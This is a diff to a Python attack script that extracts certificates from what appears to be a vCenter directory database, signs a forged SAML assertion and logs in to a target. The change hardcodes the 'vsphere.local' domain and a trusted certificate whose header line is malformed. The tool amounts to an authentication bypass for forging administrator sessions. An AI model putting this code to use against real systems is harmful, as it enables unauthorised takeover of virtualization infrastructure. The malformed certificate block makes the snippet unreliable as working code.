@@ -22,6 +22,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 idp_cert_flag = b'\x30\x82\x04'
 trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
+
 trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 not_it_list = [b'Engineering', b'California', b'object']
 
@@ -341,6 +342,30 @@ if __name__ == '__main__':
     bin_stream = bitstring.ConstBitStream(in_stream)
     idp_cert = get_idp_cert(bin_stream, args.verbose)
     trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
+    domain = 'vsphere.local'
+    trusted_cert_1 = \
+"""--BEGIN CERTIFICATE-----
+MIIDojCCAoqgAwIBAgIJAPROBCmEjumVMA0GCSqGSIb3DQEBCwUAMG0xCzAJBgNV
+BAMMAkNBMRcwFQYKCZImiZPyLGQBGRYHdnNwaGVyZTEVMBMGCgmSJomT8ixkARkW
+BWxvY2FsMQswCQYDVQQGEwJVUzEhMB8GA1UECgwYcm96dmF2YzAxLnJvemF2ZXJl
+LmxvY2FsMB4XDTE2MDIxNTE2NTE1MVoXDTI2MDIxMjE2NTE1MVowbTELMAkGA1UE
+AwwCQ0ExFzAVBgoJkiaJk/IsZAEZFgd2c3BoZXJlMRUwEwYKCZImiZPyLGQBGRYF
+bG9jYWwxCzAJBgNVBAYTAlVTMSEwHwYDVQQKDBhyb3p2YXZjMDEucm96YXZlcmUu
+bG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCpbLb46NNeoiuT
+Ea9VmJKRfBdrhSgQIlLbSgHIRn3eU16LeFIGlRGYIQU44btQm1qTuS7akfpdUHUd
+0RW94PZG4dcw08qDal+VgwPYUyeo9pDw6Rji5UV8Ln9cw1PU0RQ2wJAtVEwYt7eZ
+jRmyuMoYJgGM3Wf5rO8fAEKA8jvKALleExGqwP8gVxHJHIMuWNDvUTHxg1l0mEX0
+Kfzw/ebbuwH8jSk+Dz8Wg2RZC8iDK3Hl/N0D8lbHFfa96QAG76oInGjQk4A5iJpH
+xf74OKC0846vpmozZVnN5iX9WPdvmxrVgMRp+Zko3LMhRG1c6fsCpPyndfTpyFFy
+SL/YmlZ/AgMBAAGjRTBDMB0GA1UdDgQWBBRhF4KOyIoQFr0iQOFO5VMXw3CJVjAO
+BgNVHQ8BAf8EBAMCAQYwEgYDVR0TAQH/BAgwBgEB/wIBADANBgkqhkiG9w0BAQsF
+AAOCAQEAfx5SZbOGpRQRX4023netX4+fGnohdrUMGCuFbNGymNx9QbkeJr+wyrBT
+wAuxcymhd1xkpjHy2K6gfKdTmD+jc1vasB7PcyDvuVsh4lp2fzh3ZWNNJLdZnfUo
+l1DBmbSN8Y6yhr+yutJ1mdOgLawzohevHqOA0u785oRzeMJR0oN45ADw/o4lXJ6t
+cKJrz35mUAe+W+xhphtUUwggfDk4F4oEikom58FbaeYJleDaRVI2ZuWKc0iIcYrV
+2Y9cdeexoxPeJuuh51Ck2n56xIY4cECAHxtvz4k2HBAm/qJc95e56cTdTQ9H6rmL
+Ye04JpHfpJ4qDDO8J7/dBjuM37pOXg==
+-----END CERTIFICATE-----"""
     trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
     
 
@@ -352,3 +377,5 @@ if __name__ == '__main__':
     print (trusted_cert_2)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(args.target, s)
+
+
